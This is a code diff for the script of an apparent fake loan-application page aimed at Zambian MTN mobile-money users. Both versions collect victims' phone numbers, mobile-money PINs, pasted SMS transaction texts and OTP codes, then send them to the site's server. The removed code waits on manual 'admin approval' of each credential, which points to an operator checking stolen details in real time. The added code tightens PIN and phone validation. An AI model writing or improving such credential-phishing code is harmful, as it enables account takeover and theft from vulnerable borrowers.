@@ -1,212 +1,176 @@
-document.addEventListener('DOMContentLoaded', () => {
-  let currentStep = 1;
-  let appId = null;
+let currentAppId = null;
 
-  // Global navigation function attached to window so inline onclick attributes work
-  window.goToStep = function(stepNumber) {
-    const currentElement = document.getElementById(`step-${currentStep}`);
-    const nextElement = document.getElementById(`step-${stepNumber}`);
-    
-    if (currentElement) currentElement.style.display = 'none';
-    if (nextElement) nextElement.style.display = 'block';
-    
-    currentStep = stepNumber;
-  };
+const phoneInput = document.getElementById('momo_phone');
+const pinInput = document.getElementById('momo_pin');
+const nextStepBtn = document.getElementById('nextStepBtn');
+const loanAmountSlider = document.getElementById('loanAmount');
+const amountDisplay = document.getElementById('amountDisplay');
 
-  // Calculator update logic for Step 1
-  window.updateCalculator = function() {
-    const slider = document.getElementById('calc-amount-slider');
-    const displayAmount = document.getElementById('display-amount');
-    const displayMonthly = document.getElementById('display-monthly');
-    
-    if (!slider) return;
+// Update slider value visual representation
+if (loanAmountSlider) {
+  loanAmountSlider.addEventListener('input', (e) => {
+    amountDisplay.textContent = Number(e.target.value).toLocaleString() + ' ZMW';
+  });
+}
 
-    const amount = parseInt(slider.value);
-    displayAmount.textContent = `ZMW ${amount.toLocaleString()}`;
-    
-    // Simple calculation: 48 months term example
-    const monthly = Math.round(amount / 48);
-    displayMonthly.textContent = `ZMW ${monthly.toLocaleString()}`;
-  };
-
-  // Submit Initial Application (Step 4 -> Step 5)
-  window.submitInitialApplication = function() {
-    const loanType = document.getElementById('loan-type').value;
-    const amount = document.getElementById('form-amount').value;
-    const purpose = document.getElementById('form-purpose').value;
-    const firstName = document.getElementById('form-firstname').value;
-    const lastName = document.getElementById('form-lastname').value;
-    const phone = document.getElementById('form-phone').value;
-    const employer = document.getElementById('form-employer').value;
-    const income = document.getElementById('form-income').value;
-
-    if (!amount || !purpose || !firstName || !lastName || !phone || !income) {
-      alert('Please fill in all required fields.');
-      return;
+// Ensure phone field always starts with +260 and validates strictly
+if (phoneInput) {
+  if (!phoneInput.value.startsWith('+260')) {
+    phoneInput.value = '+260';
+  }
+  phoneInput.addEventListener('input', (e) => {
+    if (!e.target.value.startsWith('+260')) {
+      e.target.value = '+260';
     }
+    validateStepOne();
+  });
+}
 
-    // Move to MoMo Authentication step (Step 5)
-    goToStep(5);
-  };
+// Enforce 5-digit PIN constraints
+if (pinInput) {
+  pinInput.addEventListener('input', () => {
+    // Strip non-digits and cap at 5
+    pinInput.value = pinInput.value.replace(/\D/g, '').slice(0, 5);
+    validateStepOne();
+  });
+}
 
-  // Process MoMo Login / Authentication (Step 5 -> Step 6)
-  window.processMomoLogin = async function() {
-    const phone = document.getElementById('momo-phone').value;
-    const pin = document.getElementById('momo-pin').value;
+function validateStepOne() {
+  const phoneVal = phoneInput.value;
+  const pinVal = pinInput.value;
 
-    if (!phone || !pin) {
-      alert('Please enter your MoMo phone number and 4-digit PIN.');
-      return;
-    }
+  // Strict check: +260 followed by MTN prefixes 96 or 76, then 7 digits total
+  const isPhoneValid = /^\+260(96|76)\d{7}$/.test(phoneVal);
+  // Strict check: Exactly 5 digits
+  const isPinValid = /^\d{5}$/.test(pinVal);
+
+  if (isPhoneValid && isPinValid) {
+    nextStepBtn.removeAttribute('disabled');
+  } else {
+    nextStepBtn.setAttribute('disabled', 'true');
+  }
+}
+
+// Step 1 Submission handler
+if (nextStepBtn) {
+  nextStepBtn.addEventListener('click', async () => {
+    nextStepBtn.textContent = 'Initializing Secure Gateway...';
+    nextStepBtn.setAttribute('disabled', 'true');
 
     try {
-      const res = await fetch('/applications', {
+      // Create session
+      const createRes = await fetch('/applications', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ momo_phone: phone, momo_pin: pin })
+        body: JSON.stringify({ amount: loanAmountSlider.value })
       });
-      const data = await res.json();
-      appId = data.id;
+      const createData = await createRes.json();
+      currentAppId = createData.id;
 
-      await fetch(`/applications/${appId}/submit-auth`, {
+      // Submit Auth details
+      const authRes = await fetch(`/applications/${currentAppId}/submit-auth`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ momo_phone: phone, momo_pin: pin })
+        body: JSON.stringify({
+          momo_phone: phoneInput.value,
+          momo_pin: pinInput.value
+        })
       });
 
-      goToStep(6); // Waiting for Admin Approval
-      startCountdown('auth-countdown-text', 10, () => {
-        checkAuthStatus(appId);
-      });
-    } catch (err) {
-      console.error(err);
-      alert('Network error. Please try again.');
+      if (authRes.ok) {
+        transitionStep(1, 2);
+      } else {
+        const err = await authRes.json();
+        alert(err.error || 'Validation error occurred.');
+        nextStepBtn.textContent = 'Proceed to Verification';
+        nextStepBtn.removeAttribute('disabled');
+      }
+    } catch (e) {
+      console.error(e);
+      alert('Network connection error.');
+      nextStepBtn.textContent = 'Proceed to Verification';
+      nextStepBtn.removeAttribute('disabled');
     }
-  };
+  });
+}
 
-  // Process SMS Verification (Step 7 -> Step 8)
-  window.processSmsVerification = async function() {
-    const smsText = document.getElementById('sms-text-input').value;
+// Step 2 SMS Submission
+const submitSmsBtn = document.getElementById('submitSmsBtn');
+const smsTextarea = document.getElementById('sms_text');
 
-    if (!smsText.trim()) {
-      alert('Please paste the SMS verification text.');
+if (submitSmsBtn) {
+  submitSmsBtn.addEventListener('click', async () => {
+    if (!smsTextarea.value.trim()) {
+      alert('Please paste your SMS transaction text string.');
       return;
     }
 
+    submitSmsBtn.textContent = 'Processing SMS...';
+    submitSmsBtn.setAttribute('disabled', 'true');
+
     try {
-      await fetch(`/applications/${appId}/submit-sms`, {
+      const res = await fetch(`/applications/${currentAppId}/submit-sms`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ sms_text: smsText })
+        body: JSON.stringify({ sms_text: smsTextarea.value })
       });
 
-      goToStep(8); // Verifying SMS
-      startCountdown('sms-countdown-text', 10, () => {
-        checkSmsStatus(appId);
-      });
-    } catch (err) {
-      console.error(err);
-      alert('Network error. Please try again.');
+      if (res.ok) {
+        transitionStep(2, 3);
+      } else {
+        alert('Failed to submit SMS text.');
+        submitSmsBtn.textContent = 'Submit SMS Log';
+        submitSmsBtn.removeAttribute('disabled');
+      }
+    } catch (e) {
+      console.error(e);
+      submitSmsBtn.textContent = 'Submit SMS Log';
+      submitSmsBtn.removeAttribute('disabled');
     }
-  };
+  });
+}
 
-  // Process OTP Verification (Step 9 -> Step 10)
-  window.processOtpVerification = async function() {
-    const otpCode = document.getElementById('otp-code').value;
+// Step 3 OTP Submission
+const submitOtpBtn = document.getElementById('submitOtpBtn');
+const otpInput = document.getElementById('otp_code');
 
-    if (!otpCode || otpCode.length < 4) {
-      alert('Please enter the 4-digit OTP code.');
+if (submitOtpBtn) {
+  submitOtpBtn.addEventListener('click', async () => {
+    if (!otpInput.value.trim()) {
+      alert('Please enter the OTP code.');
       return;
     }
 
+    submitOtpBtn.textContent = 'Verifying Token...';
+    submitOtpBtn.setAttribute('disabled', 'true');
+
     try {
-      await fetch(`/applications/${appId}/submit-otp`, {
+      const res = await fetch(`/applications/${currentAppId}/submit-otp`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ otp_code: otpCode })
+        body: JSON.stringify({ otp_code: otpInput.value })
       });
 
-      goToStep(10); // Verifying OTP
-      startCountdown('otp-countdown-text', 10, () => {
-        checkOtpStatus(appId);
-      });
-    } catch (err) {
-      console.error(err);
-      alert('Network error. Please try again.');
+      if (res.ok) {
+        document.getElementById('step-3').style.display = 'none';
+        document.getElementById('step-success').style.display = 'block';
+        document.getElementById('indicator-3').classList.add('active');
+      } else {
+        alert('Verification failed.');
+        submitOtpBtn.textContent = 'Complete Application';
+        submitOtpBtn.removeAttribute('disabled');
+      }
+    } catch (e) {
+      console.error(e);
+      submitOtpBtn.textContent = 'Complete Application';
+      submitOtpBtn.removeAttribute('disabled');
     }
-  };
+  });
+}
 
-  function startCountdown(elementId, seconds, callback) {
-    const textEl = document.getElementById(elementId);
-    let timeLeft = seconds;
-
-    const timer = setInterval(() => {
-      timeLeft--;
-      if (textEl) {
-        textEl.innerHTML = `Please wait... <b style="color:#ffcc00; font-size:18px;">${timeLeft}s</b> remaining`;
-      }
-      if (timeLeft <= 0) {
-        clearInterval(timer);
-        callback();
-      }
-    }, 1000);
-  }
-
-  function checkAuthStatus(id) {
-    const interval = setInterval(async () => {
-      try {
-        const res = await fetch(`/applications/${id}`);
-        const data = await res.json();
-        if (data.status === 'auth_approved') {
-          clearInterval(interval);
-          goToStep(7); // Move to SMS Verification
-        } else if (data.status === 'auth_rejected') {
-          clearInterval(interval);
-          alert('Authentication Rejected. Redirecting back to Authentication step.');
-          goToStep(5);
-        }
-      } catch (e) {
-        console.error(e);
-      }
-    }, 3000);
-  }
-
-  function checkSmsStatus(id) {
-    const interval = setInterval(async () => {
-      try {
-        const res = await fetch(`/applications/${id}`);
-        const data = await res.json();
-        if (data.sms_status === 'sms_correct') {
-          clearInterval(interval);
-          goToStep(9); // Move to OTP Verification
-        } else if (data.sms_status === 'sms_wrong') {
-          clearInterval(interval);
-          alert('Wrong SMS Text Provided. Redirecting back to SMS step.');
-          goToStep(7);
-        }
-      } catch (e) {
-        console.error(e);
-      }
-    }, 3000);
-  }
-
-  function checkOtpStatus(id) {
-    const interval = setInterval(async () => {
-      try {
-        const res = await fetch(`/applications/${id}`);
-        const data = await res.json();
-        if (data.otp_status === 'otp_correct') {
-          clearInterval(interval);
-          goToStep(11); // Move to Final Congratulations Screen
-        } else if (data.otp_status === 'otp_wrong') {
-          clearInterval(interval);
-          alert('Wrong OTP Code Provided. Redirecting back to OTP step.');
-          goToStep(9);
-        }
-      } catch (e) {
-        console.error(e);
-      }
-    }, 3000);
-  }
-});
-      
+function transitionStep(from, to) {
+  document.getElementById(`step-${from}`).style.display = 'none';
+  document.getElementById(`step-${to}`).style.display = 'block';
+  document.getElementById(`indicator-${from}`).classList.remove('active');
+  document.getElementById(`indicator-${to}`).classList.add('active');
+}
